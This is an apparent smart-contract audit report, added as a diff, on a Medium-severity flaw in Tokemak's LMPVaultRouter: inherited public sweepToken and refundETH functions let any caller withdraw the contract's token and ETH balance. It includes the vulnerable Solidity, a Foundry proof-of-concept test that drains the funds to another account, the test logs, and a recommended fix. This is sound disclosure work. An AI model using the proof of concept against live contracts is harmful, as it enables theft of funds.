@@ -1,0 +1,97 @@
+# [M] In LMPVaultRouter anyone can withdraw funds from the contract due to inherited public `sweepToken` and `refuntETH` functions
+
+## Summary
+Severity: Medium
+Reporter: Happy Plastic Crow
+Source: https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouter.sol#L14
+Type: audit-issue
+
+## Details
+# In LMPVaultRouter anyone can withdraw funds from the contract due to inherited public `sweepToken` and `refuntETH` functions
+## Summary
+`LMPVaultRouter.sol` which is the entry point for the end user has a parent's parent which is  `PeripheryPayments.sol`. The latter implements public functions that allow anyone to "rescue" funds from the contract - which simply means ability to withdraw the current balance of the contract to the first caller. This may be used to constantly steal any `LMPVaultRouter.sol` contract balance, and is unlikely to be used for its legitimate purpose, since even the legitimate caller can be frontrun. However, `LMPVaultRouter` does not handle funds directly but act as an intermediate party, therefore the impact should be considered more like rescue functions were public, and like not a theft of stored funds.
+
+## Vulnerability Detail
+In [LMPVaultRouter](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouter.sol#L14) the inheritance is set to `contract LMPVaultRouter is ILMPVaultRouter, LMPVaultRouterBase`. Further, in [LMPVaultRouterBase](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVaultRouterBase.sol#L15) the inheritance is set to `abstract contract LMPVaultRouterBase is ILMPVaultRouterBase, SelfPermit, Multicall, PeripheryPayments`. The last of them, [PeripheryPayments](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/utils/PeripheryPayments.sol#L58-L69) has two public routines which allow anyone to withdraw balance of the contract.
+Upon deployment, `LMPVaultRouter` will have all utilities of the inherited contracts, including these functions. That means, that it will also have these public functions allowing anyone to withdraw funds from the `LMPVaultRouter` contract.
+
+## Impact
+Any funds that will be left on the contract can be withdrawn by anyone. It is most likely that these won't be significant amount, but anything that is sent by mistake can be immediately stolen by bots or first users who see it profitable. 
+
+## Code Snippet
+Following the description from section Vulnerability Detail, the final code in `PeripheryPayments.sol` is below:
+```solidity
+    function sweepToken(IERC20 token, uint256 amountMinimum, address recipient) public payable {
+        uint256 balanceToken = token.balanceOf(address(this));
+        if (balanceToken < amountMinimum) revert InsufficientToken();
+
+        if (balanceToken > 0) {
+            token.safeTransfer(recipient, balanceToken);
+        }
+    }
+
+    function refundETH() external payable {
+        if (address(this).balance > 0) Address.sendValue(payable(msg.sender), address(this).balance);
+    }
+```
+
+By modifying the existing unit test `LMPVaultRouter.t.sol` following routine was created to see if random user can use these functions on the LMPVaultRouter contract and access funds that are on it:
+
+```solidity
+function test_deposit_() public {
+        uint256 amount = depositAmount; // TODO: fuzz
+        baseAsset.approve(address(lmpVaultRouter), amount);
+
+        // -- try to fail slippage first -- //
+        // set threshold for just over what's expected
+        uint256 minSharesExpected = lmpVault.previewDeposit(amount) + 1;
+        vm.expectRevert(abi.encodeWithSelector(ILMPVaultRouterBase.MinSharesError.selector));
+        lmpVaultRouter.deposit(lmpVault, address(this), amount, minSharesExpected);
+
+        // -- now do a successful scenario -- //
+        _deposit(lmpVault, amount);
+        deal(address(CVX_MAINNET), address(lmpVaultRouter), 1000);
+        
+        console2.log("Balance CVX of lmpVaultRouter before: ", IERC20(CVX_MAINNET).balanceOf(address(lmpVaultRouter)));
+        console2.log("Balance CVX of Alice before: ", IERC20(CVX_MAINNET).balanceOf(alice));
+        vm.prank(alice);
+        lmpVaultRouter.sweepToken(IERC20(CVX_MAINNET), 500, alice); //minimal amount, will withdraw all
+        console2.log("Balance CVX of lmpVaultRouter after: ", IERC20(CVX_MAINNET).balanceOf(address(lmpVaultRouter)));
+        console2.log("Balance CVX of Alice after: ", IERC20(CVX_MAINNET).balanceOf(alice));
+
+        deal(address(lmpVaultRouter), 2 ether);
+        
+        console2.log("Balance ether of lmpVaultRouter before: ", address(lmpVaultRouter).balance / 1e18);
+        console2.log("Balance ether of Alice before: ", alice.balance / 1e18);
+        vm.prank(alice);
+        lmpVaultRouter.refundETH(); //minimal amount, will withdraw all
+        console2.log("Balance ether of lmpVaultRouter after: ", address(lmpVaultRouter).balance / 1e18);
+        console2.log("Balance ether of Alice after: ", alice.balance / 1e18);
+        
+        vm.prank(alice);
+    }
+```
+
+Logs:
+
+```text
+Logs:
+  Balance CVX of lmpVaultRouter before:  1000
+  Balance CVX of Alice before:  0
+  Balance CVX of lmpVaultRouter after:  0
+  Balance CVX of Alice after:  1000
+  Balance ether of lmpVaultRouter before:  2
+  Balance ether of Alice before:  0
+  Balance ether of lmpVaultRouter after:  0
+  Balance ether of Alice after:  2
+```
+
+Which confirms that these functions are part of LMPVaultRouter when its deployed.
+
+## Tool used
+
+Manual Review
+Foundry
+
+## Recommendation
+Override these functions or disable them, depending on what the team decides to do with tokens that happen to be trapped on the contract. They can be either accessible to a privileged caller, to really perform a "rescue" role, or instead to being sent to the sender, could be used as rewards within the protocol.
